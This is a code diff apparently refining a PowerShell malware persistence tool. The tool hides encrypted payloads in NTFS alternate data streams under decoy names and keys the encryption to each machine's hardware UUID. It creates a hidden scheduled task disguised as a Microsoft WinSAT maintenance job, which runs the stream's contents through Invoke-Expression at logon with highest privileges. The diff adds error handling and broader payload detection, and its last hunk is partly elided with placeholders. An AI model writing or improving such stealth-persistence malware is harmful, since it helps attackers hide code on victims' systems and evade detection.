@@ -16,15 +16,14 @@
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 Write-Host "Admin: $isAdmin | Encrypt: $Encrypt | Targets: $($Targets -join ', ')| Persist: $($Persist -join ', ')" -ForegroundColor Cyan
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# ALL 8 FUNCTIONS - COMPLETE & WORKING
-# ═══════════════════════════════════════════════════════════════════════════════
-
 function Get-RandomADSConfig {
     $adj = @('Sys','Kernel','Cache','Log','Data','Temp','Boot','User')
     $noun = @('Mgr','Svc','Util','Chk','Idx','Core','Stream','Host')
     $exts = @('.dat','.log','.idx','.tmp','.chk')
     $ntfsStreams = @('$EA','$OBJECT_ID','$SECURITY_DESCRIPTOR','$LOGGED_UTILITY_STREAM')
+    $seed = (Get-CimInstance Win32_ComputerSystemProduct).UUID + $env:COMPUTERNAME
+    $sha256 = [System.Security.Cryptography.SHA256]::Create()
+    $keyBytes = $sha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($seed))
     
     @{
         HostPath = if($Randomize) { 
@@ -39,9 +38,6 @@ function Get-RandomADSConfig {
             ':' + (Get-Random -InputObject $legitimateStreams + $randomStream)
         } else { ':syc_payload' }
         # Generate 32-byte key from UUID + hostname
-        $seed = (Get-CimInstance Win32_ComputerSystemProduct).UUID + $env:COMPUTERNAME
-        $sha256 = [System.Security.Cryptography.SHA256]::Create()
-        $keyBytes = $sha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($seed))
         AESKey = [Convert]::ToBase64String($keyBytes)  # Guaranteed 44-char Base64 string (32 bytes)
         VBSPrefix = if($Randomize) { 'app_log_' + ((1..6|%{Get-Random -Min 97 -Max 123|%{[char]$_}})-join'') + '.' } else { 'app_log_a.' }
     }
@@ -64,7 +60,8 @@ function ConvertTo-PSPayload($PayloadObj) {
         try {
             $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($content))
             # If successful and looks like PowerShell, return decoded
-            if($decoded -match '^(IEX|Invoke-Expression|\$|function)') {
+            if($decoded -match '(IEX|Invoke-Expression|Import-Module|New-Object|Get-|Set-|Start-|function\s+\w+|\$\w+\s*=)') {
+                Write-Verbose "Detected Base64-encoded PowerShell, using decoded version"
                 return $decoded
             }
         } catch {
@@ -87,15 +84,21 @@ function Protect-Payload($Payload, $KeyB64) {
 }
 
 function New-ADSPayload($HostPath, $StreamName, $Payload, $Config) {
-    # Ensure host file exists
-    if(!(Test-Path $HostPath)) { '' | Out-File $HostPath -Encoding ASCII }
-    
-    # Write payload (encrypted if specified)
-    $finalPayload = if($Encrypt) { Protect-Payload $Payload $Config.AESKey } else { $Payload }
-    $finalPayload | Out-File "$HostPath$StreamName" -Encoding UTF8 -Force
-    
-    Write-Host "ADS Created: $HostPath$StreamName" -ForegroundColor Green
-    return "$HostPath$StreamName"
+    try {
+        if(!(Test-Path $HostPath)) { 
+            '' | Out-File $HostPath -Encoding ASCII -ErrorAction Stop 
+        }
+        
+        $finalPayload = if($Encrypt) { Protect-Payload $Payload $Config.AESKey } else { $Payload }
+        $finalPayload | Out-File "$HostPath$StreamName" -Encoding UTF8 -Force -ErrorAction Stop
+        
+        Write-Host "ADS Created: $HostPath$StreamName" -ForegroundColor Green
+        return "$HostPath$StreamName"
+        
+    } catch {
+        Write-Error "Failed to create ADS: $_"
+        throw
+    }
 }
 
 function New-Loader($ADSPath, $Config) {
@@ -160,13 +163,18 @@ function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
             
             $rootADS = "C:\:ads_$((Get-Random -Minimum 1000 -Maximum 9999))"
             
-            # Copy loader content to root ADS
-            Get-Content $LoaderPath -Raw | Set-Content -Path $rootADS -Force
+            # Store EXECUTION COMMAND, not loader source
+            if($LoaderPath.EndsWith('.vbs')) {
+                # For VBS: Store the wscript command
+                "wscript.exe //B `"$LoaderPath`"" | Set-Content -Path $rootADS -Force
+                $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
+            } else {
+                # For PS1: Store the PowerShell source
+                Get-Content $LoaderPath -Raw | Set-Content -Path $rootADS -Force
+                $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
+            }
             
-            # Create task to execute root ADS on logon
-            $taskName = "\Microsoft\Windows\Maintenance\WinSAT_$((New-Guid).Guid.Split('-')[0])"
-            $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
-            
+            $taskName = "\Microsoft\Windows\Maintenance\WinSAT_$((Get-Random -Minimum 100 -Maximum 999))"
             & schtasks /create /tn $taskName /tr $action /sc onlogon /rl highest /f | Out-Null
             Write-Verbose "VolRoot ADS: $rootADS -> Task: $taskName"
         }
@@ -219,9 +227,14 @@ $allFunctions
 `$Encrypt = `$$EncryptFlag
 `$NoExec = `$$NoExecFlag
 
-`$rawPayload = ConvertTo-PSPayload @'
-$($PayloadObj -join "`n")
-'@
+$remoteBlock = [scriptblock]::Create(@"
+...
+`$rawPayload = ConvertTo-PSPayload `$using:PayloadText
+...
+"@)
+
+Invoke-Command ... -ArgumentList $PayloadObj
+
 `$cfg = Get-RandomADSConfig
 `$adsPath = New-ADSPayload `$cfg.HostPath `$cfg.StreamName `$rawPayload `$cfg
 `$loaderPath = New-Loader `$adsPath `$cfg
